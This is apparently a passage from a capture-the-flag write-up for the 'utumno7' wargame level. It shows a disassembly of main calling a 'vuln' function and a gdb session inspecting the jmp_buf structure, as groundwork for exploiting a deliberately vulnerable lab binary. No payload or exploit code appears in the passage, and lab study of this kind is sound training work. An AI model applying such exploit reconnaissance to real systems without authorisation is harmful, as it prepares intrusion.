 804850c:	e8 6f fe ff ff       	call   8048380 <exit@plt>
 8048511:	68 d0 85 04 08       	push   $0x80485d0
 8048516:	e8 55 fe ff ff       	call   8048370 <puts@plt>
 804851b:	83 c4 04             	add    $0x4,%esp
 804851e:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048521:	83 c0 04             	add    $0x4,%eax
 8048524:	8b 00                	mov    (%eax),%eax
 8048526:	50                   	push   %eax
 8048527:	e8 7f ff ff ff       	call   80484ab <vuln>
 804852c:	83 c4 04             	add    $0x4,%esp
 804852f:	b8 00 00 00 00       	mov    $0x0,%eax
 8048534:	c9                   	leave
 8048535:	c3                   	ret
```



ptype to check structure

```shell
(gdb) b main
Breakpoint 1 at 0x8048504: file utumno7.c, line 33.
(gdb) r
Starting program: /utumno/utumno7

Breakpoint 1, main (argc=1, argv=0xffffd724) at utumno7.c:33
33	utumno7.c: No such file or directory.
(gdb) ptype jmp_buf
type = struct __jmp_buf_tag {
    __jmp_buf __jmpbuf;
    int __mask_was_saved;
    __sigset_t __saved_mask;
} [1]
(gdb) ptype __jmp_buf
type = int [6]
```

